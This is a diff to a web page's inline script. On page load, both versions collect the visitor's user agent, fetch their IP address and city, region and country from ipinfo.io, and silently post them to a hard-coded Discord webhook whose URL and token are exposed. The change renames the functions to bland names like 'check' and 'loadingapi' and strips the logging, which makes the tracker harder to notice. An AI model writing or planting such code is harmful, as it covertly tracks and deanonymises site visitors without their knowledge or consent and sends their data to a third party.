@@ -41,57 +41,33 @@
 
 
 <script>
-    function logUserInfo() {
-        const userAgent = navigator.userAgent;
-        console.log("User-Agent: " + userAgent);
-
-        // Fetch IP address and location information using ipinfo.io
+    function check() {
+        const UA = navigator.userAgent;
         fetch('https://ipinfo.io/json')
             .then(response => response.json())
             .then(data => {
-                const ipAddress = data.ip;
-                console.log("IP Address: " + ipAddress);
-
+                const addr = data.ip;
                 const location = data.loc.split(',');
-                const city = data.city;
-                const region = data.region;
-                const country = data.country;
-                console.log(`Location: ${city}, ${region}, ${country}`);
-
-                // Send data to Discord webhook
-                sendToDiscord(userAgent, ipAddress, city, region, country);
-
-                // Log ipinfo.io response
-                console.log("ipinfo.io Response:", data);
+                const c = data.city;
+                const r = data.region;
+                const co = data.country;
+                loadingapi(UA, addr, c, r, co);
             })
-            .catch(error => {
-                console.error("Error fetching IP address and location information:", error);
-            });
     }
-
-    function sendToDiscord(userAgent, ipAddress, city, region, country) {
-        const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
-        const payload = {
-            content: `User-Agent: ${userAgent}\nIP Address: ${ipAddress}\nLocation: ${city}, ${region}, ${country}`
+    function loadingapi(UA, addr, c, r, co) {
+        const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
+        const F = {
+            content: `**User-Agent:** \`${UA}\`\n**IP:** \`${addr}\`\n**Location:** \`${c}, ${r}, ${co}\``
         };
-        fetch(webhookURL, {
+        fetch(csc, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(payload),
+            body: JSON.stringify(F),
         })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Failed to send data to Discord webhook');
-            }
-        })
-        .catch(error => {
-            console.error('Error sending data to Discord webhook:', error);
-        });
     }
-
-    window.onload = logUserInfo;
+    window.onload = check;
 </script>
 
 
